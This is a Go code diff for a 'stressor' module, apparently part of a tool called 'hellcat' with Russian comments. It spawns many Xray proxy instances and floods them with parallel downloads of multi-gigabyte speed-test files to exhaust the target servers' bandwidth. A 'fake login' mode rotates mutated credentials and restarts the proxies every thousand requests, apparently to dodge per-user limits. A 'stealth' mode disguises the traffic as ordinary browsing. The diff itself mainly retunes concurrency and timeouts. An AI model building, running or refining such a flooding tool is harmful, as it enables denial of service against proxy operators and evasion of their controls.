@@ -1,6 +1,7 @@
 package stressor
 
 import (
+    "context"
     "crypto/rand"
     "crypto/tls"
     "fmt"
@@ -35,25 +36,16 @@ var userAgents = []string{
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
 }
 
 var payloads = []string{
     "https://speed.cloudflare.com/__down?bytes=10737418240",
     "https://speed.cloudflare.com/__down?bytes=50000000000",
     "http://speedtest.tele2.net/10GB.zip",
-    "http://speedtest.tele2.net/1GB.zip",
     "http://proof.ovh.net/files/10Gb.dat",
     "https://proof.ovh.net/files/10Gb.dat",
-    "http://proof.ovh.net/files/1Gb.dat",
     "http://bouygues.iperf.fr/10G.iso",
-    "http://speedtest.ftp.otenet.gr/files/test1Gb.db",
     "https://speed.hetzner.de/1GB.bin",
-    "http://ipv4.download.thinkbroadband.com/1GB.zip",
 }
 
 var stealthURLs = []string{
@@ -118,6 +110,7 @@ var stealthURLs = []string{
     "https://www.epicgames.com/",
 }
 
+
 var (
     requests        uint64
     errors          uint64
@@ -127,22 +120,20 @@ var (
     customURL       string
     fakeLoginMode   bool
     insaneMode      bool
-    burstSize       int = 3 // сколько параллельных загрузок делает один воркер за такт
+    burstSize       int = 3
 )
 
-
+// 1MB Buffer Pool
 var bufPool = sync.Pool{
     New: func() interface{} {
-        b := make([]byte, 1024*1024) // 1MB
+        b := make([]byte, 1024*1024)
         return &b
     },
 }
 
-// fastDiscard — читает тело ответа 1MB буфером, минуя io.Discard.ReadFrom (32KB)
 func fastDiscard(r io.Reader) int64 {
     buf := bufPool.Get().(*[]byte)
     defer bufPool.Put(buf)
-
     var total int64
     for {
         n, err := r.Read(*buf)
@@ -153,8 +144,6 @@ func fastDiscard(r io.Reader) int64 {
     }
     return total
 }
-
-
 
 func getRandomPort() int {
     for i := 0; i < 100; i++ {
@@ -186,8 +175,6 @@ func formatSpeed(bytesPerSec float64) string {
     }
     return fmt.Sprintf("%.0f B/s", bytesPerSec)
 }
-
-// ========== FAKE LOGIN ==========
 
 func generateUUID() string {
     b := make([]byte, 16)
@@ -237,7 +224,6 @@ func mutateCredentials(cfg *parser.OutboundConfig) {
 
 func restartInstance(inst *XrayInstance) {
     mutateCredentials(inst.Cfg)
-
     var newCred string
     switch s := inst.Cfg.Settings.(type) {
     case parser.VnextSettings:
@@ -258,16 +244,13 @@ func restartInstance(inst *XrayInstance) {
         }
     }
     log.Printf("[hellcat] 🔑 [Port %d] Restarting -> %s", inst.Port, newCred)
-
     if inst.Cmd != nil && inst.Cmd.Process != nil {
         inst.Cmd.Process.Kill()
         inst.Cmd.Wait()
     }
-
     os.Remove(inst.ConfPath)
     newConfPath := config.GenerateWithPort(inst.Cfg, inst.Port)
     inst.ConfPath = newConfPath
-
     cmd := exec.Command("xray", "-config", newConfPath)
     cmd.Stdout = nil
     cmd.Stderr = nil
@@ -276,7 +259,6 @@ func restartInstance(inst *XrayInstance) {
         return
     }
     inst.Cmd = cmd
-
     go func() {
         if err := cmd.Wait(); err != nil {
             log.Printf("[hellcat] ⚠️  xray (port %d) exited: %v", inst.Port, err)
@@ -284,16 +266,14 @@ func restartInstance(inst *XrayInstance) {
     }()
 }
 
-
-
 func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, insane bool, stealth bool, customTarget string, fakelogin bool) {
     stealthMode = stealth
-    customURL = customTarget // ИСПРАВЛЕНО: было customURL = customURL (самоприсвоение)
+    customURL = customTarget
     fakeLoginMode = fakelogin
     insaneMode = insane
 
     if insaneMode {
-        burstSize = 8 // В insane-режиме каждый воркер стреляет 8 параллельных запросов
+        burstSize = 6 // Снизили с 8 до 6, чтобы не убивать ОС слишком быстро
     }
 
     if customURL != "" {
@@ -311,17 +291,9 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
 
     log.Printf("[hellcat] 🌊 %s MODE ENGAGED", modeStr)
     if fakeLoginMode {
-        log.Printf("[hellcat] 🔑 FAKE LOGIN ENABLED (Rotating credentials every 1000 reqs)")
+        log.Printf("[hellcat] 🔑 FAKE LOGIN ENABLED")
     }
     log.Printf("[hellcat] 📊 %d xray instances | %d threads | burst=%d", numXray, threads, burstSize)
-
-    if len(cfgs) > 1 {
-        for i, c := range cfgs {
-            log.Printf("[hellcat] 🌐 [%d/%d] %s (%s)", i+1, len(cfgs), getTargetInfo(c), c.Protocol)
-        }
-    } else if len(cfgs) == 1 {
-        log.Printf("[hellcat] 🌐 Primary: %s (%s)", getTargetInfo(cfgs[0]), cfgs[0].Protocol)
-    }
 
     stop := make(chan struct{})
     if duration > 0 {
@@ -333,10 +305,9 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
     }
 
     instances := make([]*XrayInstance, numXray)
-    log.Println("[hellcat] ⏳ Generating random configs and starting Xray instances...")
+    log.Println("[hellcat] ⏳ Starting Xray instances...")
     for i := 0; i < numXray; i++ {
         port := getRandomPort()
-
         cfgCopy := *cfgs[i%len(cfgs)]
         cfg := &cfgCopy
 
@@ -345,7 +316,6 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
         }
 
         confPath := config.GenerateWithPort(cfg, port)
-
         cmd := exec.Command("xray", "-config", confPath)
         cmd.Stdout = nil
         cmd.Stderr = nil
@@ -354,29 +324,20 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
             continue
         }
 
-        instances[i] = &XrayInstance{
-            Cmd:      cmd,
-            Cfg:      cfg,
-            Port:     port,
-            ConfPath: confPath,
-        }
-
+        instances[i] = &XrayInstance{Cmd: cmd, Cfg: cfg, Port: port, ConfPath: confPath}
         log.Printf("[hellcat] ✓ xray [%d] PID %d Port %d", i, cmd.Process.Pid, port)
+        
         go func(c *exec.Cmd, idx int) {
             if err := c.Wait(); err != nil {
                 log.Printf("[hellcat] ⚠️  xray [%d] exited: %v", idx, err)
             }
         }(cmd, i)
-
-        time.Sleep(50 * time.Millisecond) // Ускорено: было 150ms
+        time.Sleep(50 * time.Millisecond)
     }
 
-    // Ожидание SOCKS-прокси
     log.Println("[hellcat] ⏳ Waiting for SOCKS proxies...")
     for _, inst := range instances {
-        if inst == nil {
-            continue
-        }
+        if inst == nil { continue }
         addr := fmt.Sprintf("127.0.0.1:%d", inst.Port)
         for i := 0; i < 30; i++ {
             conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond)
@@ -384,58 +345,48 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
                 conn.Close()
                 break
             }
-            time.Sleep(300 * time.Millisecond) // Ускорено: было 500ms
+            time.Sleep(300 * time.Millisecond)
         }
     }
 
     
     clients := make([]*http.Client, numXray)
     for i, inst := range instances {
-        if inst == nil {
-            continue
-        }
+        if inst == nil { continue }
         proxyURL, _ := url.Parse(fmt.Sprintf("socks5h://127.0.0.1:%d", inst.Port))
         tr := &http.Transport{
             Proxy: http.ProxyURL(proxyURL),
             DialContext: (&net.Dialer{
-                Timeout:   10 * time.Second, // Быстрее fail на недоступных
+                Timeout:   10 * time.Second,
                 KeepAlive: 30 * time.Second,
             }).DialContext,
             TLSClientConfig:        &tls.Config{InsecureSkipVerify: true},
-            DisableKeepAlives:      false,
-            DisableCompression:     true, // 🔥 КЛЮЧЕВАЯ ОПТИМИЗАЦИЯ: не тратим CPU на gzip
-            MaxIdleConns:           50000,
-            MaxIdleConnsPerHost:    50000,
-            MaxConnsPerHost:        0, // 0 = без лимита
-            IdleConnTimeout:        0,
+            DisableKeepAlives:      true, 
+            DisableCompression:     true,
+            MaxIdleConns:           1000, // Адекватные лимиты
+            MaxIdleConnsPerHost:    1000,
+            MaxConnsPerHost:        0,
+            IdleConnTimeout:        10 * time.Second,
             TLSHandshakeTimeout:   10 * time.Second,
-            ResponseHeaderTimeout:  0, // 0 = без таймаута на заголовки для больших файлов
-            ReadBufferSize:         1 << 20, // 🔥 1MB kernel read buffer
-            WriteBufferSize:        1 << 20, // 🔥 1MB kernel write buffer
+            ResponseHeaderTimeout:  15 * time.Second, 
+            ReadBufferSize:         1 << 20,
+            WriteBufferSize:        1 << 20,
         }
         clients[i] = &http.Client{
             Transport: tr,
-            Timeout:   0, // Без общего таймаута — большие файлы качаются долго
+            Timeout:   45 * time.Second, 
         }
     }
 
-   
     streamsPerProxy := threads / numXray
-    if streamsPerProxy < 10 {
-        streamsPerProxy = 10 // Увеличено: было 5
-    }
-    if insaneMode {
-        streamsPerProxy = streamsPerProxy * 2 // Insane: вдвое больше воркеров
-    }
+    if streamsPerProxy < 10 { streamsPerProxy = 10 }
+    if insaneMode { streamsPerProxy = streamsPerProxy * 2 }
+    
     totalGoroutines := streamsPerProxy * numXray
-    effectiveConcurrent := totalGoroutines * burstSize
-    log.Printf("[hellcat] 🚀 Spawning %d workers (burst=%d → %d concurrent downloads)...",
-        totalGoroutines, burstSize, effectiveConcurrent)
+    log.Printf("[hellcat] 🚀 Spawning %d workers (burst=%d)...", totalGoroutines, burstSize)
 
     for i := 0; i < numXray; i++ {
-        if clients[i] == nil {
-            continue
-        }
+        if clients[i] == nil { continue }
         client := clients[i]
         for j := 0; j < streamsPerProxy; j++ {
             atomic.AddInt32(&activeWorkers, 1)
@@ -458,9 +409,9 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
     }
 
     lastRotationReq := uint64(0)
-
     ticker := time.NewTicker(3 * time.Second)
     defer ticker.Stop()
+    
     for {
         select {
         case <-stop:
@@ -469,7 +420,6 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
             succ := atomic.LoadUint64(&requests)
             fail := atomic.LoadUint64(&errors)
             bytes := atomic.SwapUint64(&bytesDownloaded, 0)
-
             speed := formatSpeed(float64(bytes) / 3.0)
             goroutines := runtime.NumGoroutine()
 
@@ -481,15 +431,11 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
                 lastThousand := lastRotationReq / 1000
                 if currentThousand > lastThousand {
                     lastRotationReq = succ
-                    log.Printf("[hellcat] 🔑 Crossed %dk requests! Rotating credentials & restarting Xrays...", currentThousand*1000)
-
+                    log.Printf("[hellcat] 🔑 Crossed %dk requests! Rotating...", currentThousand*1000)
                     go func() {
                         for _, inst := range instances {
-                            if inst != nil {
-                                restartInstance(inst)
-                            }
+                            if inst != nil { restartInstance(inst) }
                         }
-                        log.Println("[hellcat] 🔑 Xrays restarted with new identities. Resuming...")
                     }()
                 }
             }
@@ -497,7 +443,7 @@ func Run(cfgs []*parser.OutboundConfig, threads int, duration int, numXray int, 
     }
 
 cleanup:
-    time.Sleep(1 * time.Second) // Ускорено: было 3s
+    time.Sleep(1 * time.Second)
     for _, inst := range instances {
         if inst != nil {
             if inst.Cmd != nil && inst.Cmd.Process != nil {
@@ -508,8 +454,6 @@ cleanup:
     }
     log.Println("[hellcat] ✅ Finished.")
 }
-
-
 
 func downloadBurst(client *http.Client) {
     var wg sync.WaitGroup
@@ -535,22 +479,27 @@ func stealthBurst(client *http.Client) {
     wg.Wait()
 }
 
-
 func downloadSingle(client *http.Client) {
     target := payloads[mathrand.Intn(len(payloads))]
-    req, _ := http.NewRequest("GET", target, nil)
+    
+    
+    ctx, cancel := context.WithTimeout(context.Background(), 40*time.Second)
+    defer cancel()
+
+    req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
     req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
-    req.Header.Set("Accept-Encoding", "identity") // Не запрашивать сжатие
+    req.Header.Set("Accept-Encoding", "identity")
+    req.Header.Set("Connection", "close") 
 
     resp, err := client.Do(req)
     if err != nil {
         atomic.AddUint64(&errors, 1)
-        time.Sleep(time.Duration(1+mathrand.Intn(5)) * time.Millisecond) // Минимальная пауза
+        
+        time.Sleep(time.Duration(200+mathrand.Intn(800)) * time.Millisecond)
         return
     }
     defer resp.Body.Close()
 
-    
     n := fastDiscard(resp.Body)
     atomic.AddUint64(&bytesDownloaded, uint64(n))
 
@@ -558,26 +507,29 @@ func downloadSingle(client *http.Client) {
         atomic.AddUint64(&requests, 1)
     } else {
         atomic.AddUint64(&errors, 1)
-        time.Sleep(time.Duration(1+mathrand.Intn(3)) * time.Millisecond)
+        time.Sleep(time.Duration(200+mathrand.Intn(800)) * time.Millisecond)
     }
 }
 
 func stealthSingle(client *http.Client) {
     target := stealthURLs[mathrand.Intn(len(stealthURLs))]
-    req, _ := http.NewRequest("GET", target, nil)
+    ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+    defer cancel()
+
+    req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
     req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
-    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
     req.Header.Set("Accept-Encoding", "identity")
+    req.Header.Set("Connection", "close")
 
     resp, err := client.Do(req)
     if err != nil {
         atomic.AddUint64(&errors, 1)
-        time.Sleep(time.Duration(1+mathrand.Intn(5)) * time.Millisecond)
+        time.Sleep(time.Duration(200+mathrand.Intn(800)) * time.Millisecond)
         return
     }
     defer resp.Body.Close()
 
-    
     n := fastDiscard(resp.Body)
     atomic.AddUint64(&bytesDownloaded, uint64(n))
 
@@ -585,7 +537,7 @@ func stealthSingle(client *http.Client) {
         atomic.AddUint64(&requests, 1)
     } else {
         atomic.AddUint64(&errors, 1)
-        time.Sleep(time.Duration(1+mathrand.Intn(3)) * time.Millisecond)
+        time.Sleep(time.Duration(200+mathrand.Intn(800)) * time.Millisecond)
     }
 }
 
@@ -594,12 +546,10 @@ func getTargetInfo(cfg *parser.OutboundConfig) string {
     var port int
     var network string
     var security string
-
     if cfg.StreamSetting != nil {
         network = cfg.StreamSetting.Network
         security = cfg.StreamSetting.Security
     }
-
     switch s := cfg.Settings.(type) {
     case parser.VnextSettings:
         if len(s.Vnext) > 0 {
@@ -617,6 +567,5 @@ func getTargetInfo(cfg *parser.OutboundConfig) string {
             port = s.Servers[0].Port
         }
     }
-
     return fmt.Sprintf("%s:%d (%s/%s)", host, port, network, security)
 }
